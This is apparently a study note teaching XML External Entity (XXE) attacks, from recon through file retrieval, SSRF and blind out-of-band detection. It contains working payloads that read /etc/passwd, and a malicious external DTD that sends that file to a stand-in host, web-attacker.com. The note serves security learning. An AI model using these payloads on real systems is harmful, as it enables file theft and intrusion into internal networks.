![[XXE Thumbnail.jpeg]]
# XML External Entities

XXE allows you to interfere with an app's processing of XML data, allowing attackers to view files on the app server filesystem and interact with the backend or external systems. Some apps use XML to transmit data between browser and server.

Apps usually use a standard library or platform API to process XML data. XML external entities are custom XML entities whose defined values are loaded from outside of the DTD where they are declared.

Various attacks happen including:

- Exploiting XXE to retrieve files
- Exploiting XXE to perform SSRF
- Exploiting blind XXE to exfiltrate data out-of-band
- Exploiting blind XXE to retrieve data via errors
# Recon

Manually testing for XXE generally involves:

- Testing for file retrieval by defining an external entity based on a well known OS file and using that entity in data that is returned in the app's response.
- Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system.
- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well known OS file.
- If the app allows uploading files with a SVG, XML, XLSX extension or other file formats that use or contain XML subcomponents, try injecting an XXE payload.
- Modifying the content type of the requests to XML type and see if the app still processes the modified data correctly. If so, injecting an XXE payload.
# XXE to Retrieve Files

To retrieve files, modify the submitted XML in two potential ways:

- Edit a DOCTYPE element that defines an external entity containing the path to the file.
- Edit a data value in the XML that is returned in the app's response to make use of the defined external entity.

For example, a stock checker may submit some XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

If there's no defenses, you can exploit it to retrieve the `passwd` file by submitting:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

It defines an external entity `&xxe;` whose value is the contents of the `passwd` file and uses the entity within the productId value, causing the app's response to include the contents of the file.

>[!info]
>There are typically a large number of data values within submitted XML in real apps. Try testing each data node in the XML individually to see whether it appears within the response.
# XXE to Perform SSRF

XXE can also be used to perform SSRF where the server-side app can be induced to make HTTP requests to any URL the server can access.

To exploit, define an external XML entity using the URL to target, and use the defined entity within a data value. If you can use it within a data value returned in a response, you can view the response from the URL within the app's response.

If not, it will be a blind SSRF attack. For example, the following XXE will make a back end HTTP request to an internal system:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

If a response comes back with something like the following:

```bash
Invalid product ID: latest
```

Try adding `latest` to the end of the URL and re-submit to slowly find the full path.
# Blind XXE

Blind XXE occurs where the app is vulnerable, but no values are returned. There are two ways to find and exploit blind XXE:

1. Triggering out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
2. Triggering XML parser errors in a way that errors contain sensitive data.
# Detecting Blind XXE using OAST Techniques

Try detecting blind XXE using the same techniques, but trigger an out-of-band network interaction to a system you control. As an example:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

It may cause the server to make a back-end HTTP request to the specified URL. Try using a Collaborator payload and monitor for and DNS and HTTP requests to the domain. If present, it means the XXE attack was successful.
# Blind XXE via XML Parameter Entities

Sometimes regular entities rare blocked by input validation or XML parser hardening. If so, try using XML parameter entities instead. Parameter entities can only be referenced elsewhere within the DTD. The declaration of an XML parameter entity includes the `%` character before the entity name:

```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```

Parameter entities are referenced using the `%` character such as:

```xml
%myparameterentity;
```

To test for blind XXE using parameter entities, try the following:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

It declares an XML parameter entity and then uses the entity within the DTD, potentially causing a DNS and HTTP request to the collaborator domain.
# Blind XXE to Exfiltrate Data via External DTD

To exfiltrate data via blind XXE, you must host a malicious DTD on a system and invoke the external DTD from within the in-band XXE payload. An example may be:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

It does as follows:

- Defines XML parameter entity containing the contents of `passwd`
- Defines an XML parameter entity containing a dynamic declaration of another XML parameter entity.
- The `exfiltrate` entity is evaluated by making an HTTP to the URL containing the value of the `file` entity within the query string.
- Uses the `eval` entity to cause the dynamic declaration of the `exfiltrate` entity to be performed.
- Uses the `exfiltrate` entity so its value is evaluated by requesting the specified URL.

To exploit, host the malicious DTD such as:

```http
http://web-attacker.com/malicious.dtd
```

And submit the following XXE payload to the vulnerable app:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

It declares an XML parameter entity and uses the entity within the DTD, causing the XML parser to fetch the external DTD and interpret it inline. The steps in the malicious DTD are executed and `passwd` is transmitted to the attacker.

>[!info]
>It may not work with some files with newlines as XML parsers fetch the URL using an API that validates the characters allowed to appear within the URL. If so, try using the FTP protocol instead. If still no success, other files may be needed.

